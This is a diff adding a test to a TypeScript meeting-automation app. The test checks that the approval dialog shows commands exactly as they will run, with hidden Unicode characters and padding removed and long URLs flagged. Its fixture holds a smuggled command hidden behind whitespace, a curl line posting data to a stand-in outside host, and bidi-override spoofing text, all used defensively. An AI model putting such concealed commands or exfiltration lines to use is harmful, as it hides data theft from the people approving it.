@@ -4,6 +4,7 @@ import { tmpdir } from 'os';
 import { dirname, join } from 'path';
 import {
   afterMeetingReady,
+  approvalQuestion,
   automationApprovalsPath,
   commandProgram,
   createAutomation,
@@ -415,4 +416,17 @@ test('a meeting made private while its automation runs sends nothing more', asyn
     ask: async () => { saveMeetingArtifact(root, { ...loadMeetingArtifact(root, record.id)!, ai: { off: true } }); return 'allow'; },
     shell: async (command: string) => { ran.push(command); return { code: 0 }; } });
   expect([later!.actions[0]!.status, ran]).toEqual(['skipped', []]);
+});
+
+test('the approval dialog shows a command as it will run: no hidden characters, no padding, nothing cut off unsaid', () => {
+  const question = approvalQuestion({ automation: 'File\u200B it', meeting: 'Weekly\nsync\u202E',
+    actions: ['Run: ./safe.sh\u202E hs.live/ \u2066 --x', 'Run: ./a.sh\t\t;\r\n          curl -d @- https://elsewhere.example.com',
+      `Send to: https://hooks.example.com/${'x'.repeat(500)}`] });
+  expect(question).not.toMatch(/[\p{Cc}\p{Cf}](?<!\n)/u);
+  expect(question.split('\n')).toEqual([
+    'The automation “File it” wants to send “Weekly sync” outside Seashell:', '',
+    'Run: ./safe.sh hs.live/ --x',
+    'Run: ./a.sh ; curl -d @- https://elsewhere.example.com',
+    `Send to: https://hooks.example.com/${'x'.repeat(365)}… (135 more characters: read the automation's file before allowing it)`, '',
+    'Allow it? Seashell asks again if the automation changes.']);
 });
